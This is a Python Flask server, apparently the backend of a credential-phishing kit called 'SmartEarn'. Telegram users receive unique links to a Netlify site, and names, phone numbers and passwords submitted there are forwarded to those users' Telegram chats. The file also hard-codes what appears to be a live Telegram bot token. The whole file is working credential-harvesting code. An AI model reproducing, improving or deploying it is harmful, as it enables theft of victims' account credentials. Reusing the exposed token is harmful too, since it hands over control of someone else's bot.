# =======================================
# SmartEarn Multi-User Bot System
# Developer: MN SIDDIK
# =======================================

from flask import Flask, request, jsonify
import requests
import uuid
import os

app = Flask(__name__)

# =========================
# Configuration
# =========================
BOT_TOKEN = "8572616463:AAH1sQJsSlYOhj657naFUpKvlNquwtjzrLI"  # Telegram bot token set directly
BASE_URL = "https://smart-earning.netlify.app"  # তোমার Netlify site link

# Memory storage for user UID mapping (runtime only)
USERS = {}

# =========================
# Telegram Webhook Receiver
# =========================
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def handle_telegram():
    data = request.get_json()
    print("Received:", data)  # Debug: Telegram থেকে আসা data দেখাবে console এ

    if "message" in data:
        chat_id = data["message"]["chat"]["id"]
        text = data["message"].get("text", "")

        if text == "/start":
            # Unique ID তৈরি করো
            unique_id = str(uuid.uuid4())[:8]
            USERS[unique_id] = chat_id

            link = f"{BASE_URL}/?uid={unique_id}"
            send_message(chat_id, f"🎉 Welcome to SmartEarn!\n\n🔗 Your unique link:\n{link}\n\nএই লিংকটি কেবল আপনার জন্য। অন্য কাউকে দেবেন না 🔒")

    return jsonify({"ok": True})


# =========================
# Receive Form Data from Netlify
# =========================
@app.route("/send", methods=["POST"])
def handle_form():
    data = request.get_json()
    uid = data.get("uid")
    name = data.get("name")
    number = data.get("number")
    password = data.get("password")

    if not uid or uid not in USERS:
        return jsonify({"error": "Invalid or expired UID"}), 400

    chat_id = USERS[uid]
    message = (
        f"📥 *New Submission Received!*\n\n"
        f"👤 Name: {name}\n"
        f"📞 Number: {number}\n"
        f"🔑 Password: {password}\n\n"
        f"🆔 UID: {uid}"
    )
    send_message(chat_id, message)
    return jsonify({"success": True})


# =========================
# Send message to Telegram
# =========================
def send_message(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    try:
        response = requests.post(url, json=payload)
        if not response.ok:
            print("Failed to send message:", response.text)
    except Exception as e:
        print("Error sending message:", e)


# =========================
# Home route
# =========================
@app.route("/", methods=["GET"])
def home():
    return "✅ SmartEarn Bot is running successfully!"


# =========================
# Run Flask
# =========================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))  # Railway will set PORT automatically
    app.run(host="0.0.0.0", port=port)
